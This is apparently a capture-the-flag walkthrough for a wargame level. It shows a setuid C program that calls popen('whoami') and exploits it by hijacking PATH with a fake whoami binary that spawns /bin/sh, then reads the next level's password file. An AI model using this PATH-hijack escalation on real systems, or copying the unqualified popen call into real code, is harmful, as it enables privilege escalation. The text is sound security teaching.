Check out the source code in level04.c
```
//writen by bla
#include <stdlib.h>
#include <stdio.h>

int main() {
    char username[1024];
    FILE* f = popen("whoami","r");
    fgets(username, sizeof(username), f);
    printf("Welcome %s", username);

    return 0;
}
```

Doesn't look like we need a buffer overflow for this challenge, considering that we can't really control what goes into the username buffer. One thing we can control, though, is what bash thinks is the `whoami` binary. When a command line utility like `ls` or `cd` or `whoami` is called, bash searches through all the paths in the PATH environment variable for the matching binary. And we *can* control the PATH environment variable in our current bash session. So what we need to do is write our own little binary that calls one of the exec functions, compile it with the name whoami, then modify the PATH environment variable.

We need to find a directory where we have write access, and chances are that /tmp is probably writable. So we type `mkdir /tmp/ZZZ`. Now that we have somewhere to write, here's a sample file named whoami.c:
```
#include <unistd.h>

int main() {
    execl("/bin/sh", "sh", NULL);

    return 0;
}
```

Now we need to compile it:
```
level4@io:/tmp/ZZZ$ gcc -o whoami whoami.c
```

Modify the PATH environment variable:
```
level4@io:/tmp/ZZZ$ export PATH=/tmp/ZZZ:$PATH
level4@io:/tmp/ZZZ$ echo $PATH
/tmp/ZZZ:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```
Excellent, now when we type `whoami`, bash will first search our directory of `/tmp/ZZZ` and run our binary which calls `execl("/bin/sh", "sh", NULL);` and subsequently get us a shell as user level5.

Now we change directories back into /levels and run the level04 binary and watch what happens.
```
level4@io:/tmp/ZZZ$ cd /levels/
level4@io:/levels$ ./level04
sh-4.2$ cat /home/level5/.pass
Welcome [the password for level5]
```
